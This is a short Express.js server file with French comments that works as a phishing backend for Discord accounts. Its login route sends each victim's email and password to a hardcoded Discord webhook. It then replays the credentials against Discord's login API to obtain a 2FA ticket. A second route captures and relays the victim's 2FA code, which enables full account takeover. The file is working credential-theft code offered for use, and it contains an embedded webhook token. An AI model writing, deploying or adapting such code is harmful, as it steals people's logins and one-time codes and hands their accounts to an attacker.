const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1565634875921272852/aMNpvHoAeH2iXdtQaGb-qwkpgc5xwJ3pB6NfhMD1_FhTGMSYM62ODX0YUcyubZt6ZRpg';

app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  
  // 1. ON ENVOIE L'INFO TOUT DE SUITE SUR TON DISCORD
  try {
    await axios.post(WEBHOOK_URL, { 
      content: `🎯 **Nouvelle tentative !**\n**Email:** \`${email}\`\n**Pass:** \`${password}\`` 
    });
  } catch (e) {
    console.log("Erreur webhook:", e.message);
  }

  // 2. ON VERIFIE SUR DISCORD POUR LE 2FA
  try {
    const r = await axios.post('https://discord.com/api/v9/auth/login', 
      { login: email, password: password },
      {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Content-Type': 'application/json'
        }
      }
    );
    
    if (r.data.mfa) {
      return res.json({ mfa: true, ticket: r.data.ticket });
    }
    return res.json({ success: true });
  } catch (error) {
    return res.json({ success: false });
  }
});

app.post('/api/mfa', async (req, res) => {
  const { email, password, code, ticket } = req.body;
  
  try {
    await axios.post(WEBHOOK_URL, { 
      content: `🔥 **2FA Soumis !**\n**Email:** \`${email}\`\n**Code:** \`${code}\`` 
    });
  } catch (e) {}

  try {
    await axios.post('https://discord.com/api/v9/auth/mfa', { ticket: ticket, code: code });
    return res.json({ success: true });
  } catch (error) {
    return res.json({ success: false });
  }
});

app.listen(3000, () => console.log('Bench prête.'));
